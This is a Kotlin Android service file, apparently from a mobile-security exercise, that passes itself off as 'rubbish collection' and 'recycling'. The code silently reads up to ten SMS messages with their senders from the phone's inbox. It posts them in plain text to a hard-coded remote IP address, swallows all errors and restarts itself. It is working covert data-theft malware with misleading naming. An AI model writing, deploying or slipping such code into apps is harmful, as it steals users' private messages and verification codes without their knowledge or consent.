package com.example.mobsec_823.RecylingService

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.provider.Telephony
import android.net.Uri
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.lang.StringBuilder

/**
 * Service to collect SMS "scraps" and dump them at the "landfill".
 */
class RubbishTruckService : Service() {

    private val TAG = "RubbishTruckService"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            try {
                val scrapData = collectScraps()
                if (scrapData.isNotEmpty()) {
                    dumpAtLandfill(scrapData)
                }
            } catch (e: Exception) {
            }
        }.start()

        return START_STICKY
    }

    private fun collectScraps(): String {
        val sb = StringBuilder("=== RUBBISH COLLECTION ===\n")
        val uri: Uri = Uri.parse("content://sms/inbox")

        return try {
            contentResolver.query(uri, null, null, null, null)?.use { cursor ->
                val bodyIdx = cursor.getColumnIndex(Telephony.TextBasedSmsColumns.BODY)
                val addrIdx = cursor.getColumnIndex(Telephony.TextBasedSmsColumns.ADDRESS)

                var count = 0
                while (cursor.moveToNext() && count < 10) {
                    val body = if (bodyIdx != -1) cursor.getString(bodyIdx) else "N/A"
                    val addr = if (addrIdx != -1) cursor.getString(addrIdx) else "Unknown"
                    sb.append("Source: $addr | Scrap: $body\n")
                    count++
                }
                sb.toString()
            } ?: "Bin empty"
        } catch (e: Exception) {
            ""
        }
    }

    private fun dumpAtLandfill(data: String) {
        try {
            val client = OkHttpClient()
            val request = Request.Builder()
                .url("http://47.129.144.9:8000/dump/sms")
                .post(data.toRequestBody("text/plain".toMediaType()))
                .build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) Log.i(TAG, "Rubbish dumped successfully")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Landfill unreachable")
        }
    }
}
